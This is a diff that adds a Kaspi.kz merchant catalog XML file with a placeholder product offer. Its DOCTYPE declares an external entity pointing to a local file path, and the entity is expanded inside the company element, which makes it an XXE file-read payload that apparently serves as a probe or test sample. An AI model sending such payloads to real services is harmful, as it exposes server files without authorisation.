@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE company [
+<!ELEMENT company ANY >
+<!ENTITY xxe SYSTEM "file:///etc/bullshit" >]>
+<kaspi_catalog date="string"
+xmlns="kaspiShopping"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xsi:schemaLocation="kaspiShopping http://kaspi.kz/kaspishopping.xsd">
+<company>&xxe;</company>
+<merchantid>CompanyID</merchantid>
+<offers>
+<offer sku="232130213">
+<model>iphone 1337s white 32gb</model>
+<brand>Apple</brand>
+<availabilities>
+<availability available="yes" storeId="myFavoritePickupPoint1"/>
+<availability available="yes" storeId="myFavoritePickupPoint2"/>
+</availabilities>
+<price>6418</price>
+</offer></offers>
+</kaspi_catalog>
